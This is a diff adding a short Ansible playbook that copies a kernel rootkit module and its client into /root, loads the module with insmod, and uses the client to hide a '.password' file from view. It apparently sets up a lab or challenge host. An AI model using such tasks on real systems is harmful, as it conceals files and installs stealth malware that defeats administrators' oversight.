@@ -1,0 +1,25 @@
+---
+
+- name: copy rootkit into /root
+  copy:
+    dest: /root/
+    src: src/rootkit.ko
+    checksum: 6a7658c81d213cfc98077fe3d7d7494994e6ab12
+    owner: root
+    group: root
+    mode: 0500
+
+- name: copy rootkit client into /root
+  copy:
+    dest: /root/
+    src: src/client
+    checksum: 4530fdfb702f7c8022ecb02aa7a75ff9a28f8806
+    owner: root
+    group: root
+    mode: 0500
+
+- name: load rootkit
+  command: insmod /root/rootkit.ko
+
+- name: hide .password file globally
+  command: /root/client --hide-file=.password
